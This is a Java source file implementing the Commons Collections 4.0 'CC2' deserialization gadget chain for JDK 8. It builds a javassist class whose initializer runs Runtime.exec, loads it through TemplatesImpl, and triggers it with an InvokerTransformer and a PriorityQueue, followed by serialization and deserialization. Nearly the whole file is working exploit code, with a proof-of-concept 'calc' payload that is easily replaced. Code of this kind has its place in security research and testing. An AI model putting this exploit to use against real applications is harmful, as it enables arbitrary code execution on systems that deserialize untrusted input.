import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.PriorityQueue;

public class CC2 { // jdk 8, commons-collections4:4.0
    public static void main(String[] args) {
        try {
            ClassPool cp = ClassPool.getDefault();
            CtClass evilClass = cp.makeClass("EvilClass");
            cp.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            evilClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));
            evilClass.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");

            TemplatesImpl tpl = new TemplatesImpl();

            byte[] byteCodes = evilClass.toBytecode();

            setFieldValue(tpl, "_bytecodes", new byte[][] {byteCodes});
            setFieldValue(tpl, "_name", "blabla");
            setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());

//            Class classLoader = Class.forName("java.lang.ClassLoader");
//            Method defineClass = classLoader.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
//            defineClass.setAccessible(true);
//            Class invoker = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),"EvilClass", byteCodes, 0, byteCodes.length);

//            invoker.newInstance();

            InvokerTransformer it = new InvokerTransformer("newTransformer", null, null);
            TransformingComparator tc = new TransformingComparator(it, null);

            PriorityQueue pq = new PriorityQueue(tc);
//            pq.add(tpl);
//            pq.add(tpl);
            setFieldValue(pq, "queue", new Object[] {tpl, tpl});
            setFieldValue(pq, "size", 2);

            deserialize(serialize(pq));

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    static ByteArrayOutputStream serialize(Object object) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            return baos;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    static void deserialize(ByteArrayOutputStream baos)  {

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void deserializeFromFile(String filename) throws IOException, ClassNotFoundException {
        try {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    static void setFinalField(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            field.set(obj, value);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    static Object getFinalField(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            return field.get(obj);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    static Object getFieldValue(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            return field.get(obj);

        } catch (Exception e) {
            System.out.println(e);
            return e;
        }

    }

    static void setFieldValue(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(obj, value);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
